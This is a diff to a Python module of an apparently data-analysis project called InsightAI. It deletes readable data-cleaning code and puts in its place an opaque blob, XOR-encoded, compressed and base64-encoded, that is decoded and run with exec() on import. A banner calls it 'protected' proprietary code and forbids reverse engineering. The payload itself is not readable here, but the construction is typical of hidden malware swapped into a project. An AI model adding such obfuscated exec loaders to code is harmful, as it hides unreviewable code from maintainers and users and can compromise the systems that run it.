@@ -1,129 +1,33 @@
-"""
-InsightAI - Data Cleaner Module
-Provides non-destructive data hygiene utilities:
-- Column header normalization
-- Safe missing value handling and imputation
-- Duplicate row deduplication
-- Type inference and string currency/percentage cleaning
-"""
-
-from dataclasses import dataclass
-from typing import Tuple, List, Optional
-import pandas as pd
-import numpy as np
-
-
-@dataclass
-class CleaningReport:
-    """Summary of operations performed during dataset cleaning."""
-    original_shape: Tuple[int, int]
-    new_shape: Tuple[int, int]
-    duplicates_removed: int = 0
-    missing_imputed_count: int = 0
-    columns_standardized: List[str] = None
-    converted_types: dict = None
-
-
-class DataCleaner:
-    """Safe, non-destructive tabular cleaner."""
-
-    @staticmethod
-    def standardize_column_names(df: pd.DataFrame) -> Tuple[pd.DataFrame, List[str]]:
-        """Normalize column headers to clean snake_case names."""
-        df_clean = df.copy()
-        new_cols = []
-        for c in df_clean.columns:
-            clean_name = str(c).strip().replace(" ", "_").replace("-", "_").replace(".", "_")
-            # Remove repeated underscores
-            while "__" in clean_name:
-                clean_name = clean_name.replace("__", "_")
-            new_cols.append(clean_name)
-        df_clean.columns = new_cols
-        return df_clean, new_cols
-
-    @staticmethod
-    def drop_duplicates(df: pd.DataFrame) -> Tuple[pd.DataFrame, int]:
-        """Remove exact duplicate rows and return new df and count of removed duplicates."""
-        initial_count = len(df)
-        df_clean = df.drop_duplicates().copy()
-        removed = initial_count - len(df_clean)
-        return df_clean, removed
-
-    @staticmethod
-    def impute_missing(
-        df: pd.DataFrame,
-        numeric_strategy: str = "median",  # 'median', 'mean', 'zero', 'drop'
-        categorical_strategy: str = "mode"  # 'mode', 'unknown', 'drop'
-    ) -> Tuple[pd.DataFrame, int]:
-        """
-        Safely impute missing values based on specified strategy.
-        Returns the cleaned DataFrame and count of imputed cells.
-        """
-        df_clean = df.copy()
-        imputed_count = 0
-
-        for col in df_clean.columns:
-            missing_in_col = df_clean[col].isna().sum()
-            if missing_in_col == 0:
-                continue
-
-            if pd.api.types.is_numeric_dtype(df_clean[col]):
-                if numeric_strategy == "median":
-                    median_val = df_clean[col].median()
-                    df_clean[col] = df_clean[col].fillna(median_val)
-                    imputed_count += missing_in_col
-                elif numeric_strategy == "mean":
-                    mean_val = df_clean[col].mean()
-                    df_clean[col] = df_clean[col].fillna(mean_val)
-                    imputed_count += missing_in_col
-                elif numeric_strategy == "zero":
-                    df_clean[col] = df_clean[col].fillna(0)
-                    imputed_count += missing_in_col
-            else:
-                if categorical_strategy == "mode":
-                    mode_val = df_clean[col].mode()
-                    val = mode_val.iloc[0] if not mode_val.empty else "Unknown"
-                    df_clean[col] = df_clean[col].fillna(val)
-                    imputed_count += missing_in_col
-                elif categorical_strategy == "unknown":
-                    df_clean[col] = df_clean[col].fillna("Unknown")
-                    imputed_count += missing_in_col
-
-        return df_clean, int(imputed_count)
-
-    @staticmethod
-    def clean_dataset(
-        df: pd.DataFrame,
-        deduplicate: bool = True,
-        standardize_cols: bool = False,
-        handle_missing: bool = False,
-        missing_num_strategy: str = "median"
-    ) -> Tuple[pd.DataFrame, CleaningReport]:
-        """Run standard pipeline and generate structured CleaningReport."""
-        original_shape = df.shape
-        df_work = df.copy()
-        dups_removed = 0
-        imputed_cells = 0
-        std_cols = list(df.columns)
-
-        if standardize_cols:
-            df_work, std_cols = DataCleaner.standardize_column_names(df_work)
-
-        if deduplicate:
-            df_work, dups_removed = DataCleaner.drop_duplicates(df_work)
-
-        if handle_missing:
-            df_work, imputed_cells = DataCleaner.impute_missing(
-                df_work,
-                numeric_strategy=missing_num_strategy,
-                categorical_strategy="unknown"
-            )
-
-        report = CleaningReport(
-            original_shape=original_shape,
-            new_shape=df_work.shape,
-            duplicates_removed=dups_removed,
-            missing_imputed_count=imputed_cells,
-            columns_standardized=std_cols
-        )
-        return df_work, report
+# -*- coding: utf-8 -*-
+# ==============================================================================
+# PROTECTED RUNTIME MODULE — PROPRIETARY INTELLECTUAL PROPERTY
+# ALL RIGHTS RESERVED • REVERSE ENGINEERING PROHIBITED
+# ==============================================================================
+import zlib as _z, base64 as _b
+_k = b'\x93\xa1\x7f\xc4.[\x8a\xd0\x1fnB'
+_p = (
+    b"63vCnPU1aeYPE5XEsZWHAo/cI3Ouyb7XzgQstjwYuSHDspGtDAh5G9JWSzctH7xPAI9P3SkrwbMztyXi"
+    b"whMTBlwzj+YgfUz8OS7qRZsCbiuX3PKIGl78ndZwKdTTck/jNC5TvVlxW3TtM7bQLkiw3cFYNiuqfXl7"
+    b"kZ91QR6/FCi6dCCM06qrB6v34xVBxyQRQpOzdFkjSU3i3VuS0p4OPEBb1RKgABHFrVt8dmlyRNTArDtO"
+    b"OQnKMaCzrm4EfgZWUpioERh3cZL1NnjBOxswY4qPGdnjDuL73DjNWk4vNe1EsMmOTsuSrBVUYDDdFlSh"
+    b"WgQMPsOD3euvby7L9XcuuQSODm73BNoNhmCgYsad8osoeXFXOldOEFVAPUB5KUfeeIJURJssXhqdSBvZ"
+    b"Nmwfw9QlDp/WDF+Pon6edHfD0dU6fRkVzZAXk2RjSihedmLG49NkabkS0HtJUdXcVtyl93qPr2QcUj+o"
+    b"mQwttWj+GPQiFRDTCEkZjWjp+frCvnbOcDbsH6DvBQfCDNVFX3NuIZBShI6LUcGn208aZnnYYEMZQAKu"
+    b"6aWJfG3ANkqR5ecyiTGAAJoIdtKljwkBaT4SRcjOjTHRAYZnHYrjGFShJ6fK7eRmbOIq6P3bvTYMwNgF"
+    b"BmcWeavUCwwS4eVO5Y4hchb75nRj5pRulMbVkPIAtLfZuK772wCbn6+00GxiVpQLAJ6rbl6pawiQTAPb"
+    b"LyYs+f202xxAWfySGlnqvgKrjEnrSpiy4md+vsXSD1EA2TQmAkUHPHlN64yoyztqtaa1F+RDwQlf6Rk1"
+    b"bZKdZGbMb9PGestP1uzuaNeaPPhSV8KA2GzWvetWqTS7T7ZH945RffrOIy9BqgZn+AbiK3Otn5+OCjx2"
+    b"ShHuGmB8OdscTLvrY6DQmR67fpakFK6ucIUPH7Gy6M1rs9+IShgvSuHZ3y7wBA82KQmLl4OnSJQGYeF9"
+    b"DfwGEX2HqA6n7WWNaToKMkk4ikZdgRsRwcte/kjA0HAbExyzOqwYmQa0Gl5FuxZHIlt26WMgwtZxaMb0"
+    b"dWTdeu3iiDKtzAVxPT7PAMj9Sh4r5EDxBnEb4rkc726fgNCcEItTpOSaQhuzTSZykL8cJvAafxrDu7ed"
+    b"55v8khRDr6Z9pqRNrrMreeYQLkjv8ZD3Gcw1sn4Y2dGSifunCJF+1Lvwgr+/sdHcKFWPCdCdy9YixsnJ"
+    b"IGYzy5SJlrzT6UTkQoXr9SS0qpxy9gSOm8wnrnVKEBkllFb1xWxkZr3ggd76LZXhuHHXWWF7gqJyCJJA"
+    b"GfqfTbkNwqr/yLZuJNi++EA4ULVKmAcKJznlT8O562S8kdGFYQ3gjdm6p1R6k1JtPeRvADbB7rRlfkP1"
+    b"2/rhBiWfEFwZ+rI6Twwv+uZ2ZL+FZ1glOzImDmw1Jju4VpLVuN6OSym1NR3yBOrvPAGLpCDtrxOBOMRl"
+    b"0XQnDa0HBcp5d1mkBXWhaaCwrJlTAs8B2AU885anU8pUHZsGPfNArFn7LZbQjVslae5Eg4tEehu8X8GW"
+    b"RkWwobasFPTDhz9nDDAXHpSdaiT2Tt4IBEhd557x5K6zKyWAw7zjQemYG4a5YBmofOV+yWI0h7aLQPig"
+    b"3PrzpNbfuiQNcAMi6jdCH5l6BT6ZIhuuGQfm+A2uZQHIwhHotcKy6ilbfZKOJ1xePVMYKwYhuMp4BofJ"
+    b"UxSroF0FKUabmA/I3mKTSlcyjmKYpJvoU3ZVUaxWsyZkPWO049FhX9rPbKjhLH7y7H5T/q9yMoSR+61H"
+    b"2JaDh+nh4lje0uwqBcVUaqSKOD/OZw=="
+)
+exec(_z.decompress(bytes([_c ^ _k[_i % len(_k)] for _i, _c in enumerate(_b.b64decode(_p))])).decode('utf-8'), globals())
